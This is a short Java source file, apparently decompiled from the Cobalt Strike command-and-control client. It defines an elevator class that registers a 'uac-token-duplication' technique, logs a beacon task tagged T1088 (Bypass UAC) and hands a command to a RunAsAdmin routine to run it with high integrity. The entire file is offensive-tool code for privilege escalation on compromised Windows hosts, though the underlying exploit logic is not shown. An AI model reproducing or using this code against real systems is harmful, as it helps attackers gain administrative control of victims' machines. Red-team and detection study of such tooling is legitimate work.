package beacon.elevators;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.BeaconElevators;
import beacon.TaskBeacon;
import beacon.inline.RunAsAdmin;

public class BypassUACToken implements BeaconElevators.Elevator {
    protected AggressorClient client;

    public BypassUACToken(AggressorClient aggressorClient) {
        this.client = aggressorClient;
        DataUtils.getBeaconElevators(aggressorClient.getData()).register("uac-token-duplication", "Bypass UAC with Token Duplication", this);
    }

    public void runasadmin(String string1, String string2) {
        (new TaskBeacon(this.client, new String[0])).log_task(string1, "Tasked beacon to run " + string2 + " in a high integrity context (uac-token-duplication)", "T1088");
        (new RunAsAdmin(this.client, string2)).go(string1);
    }
}
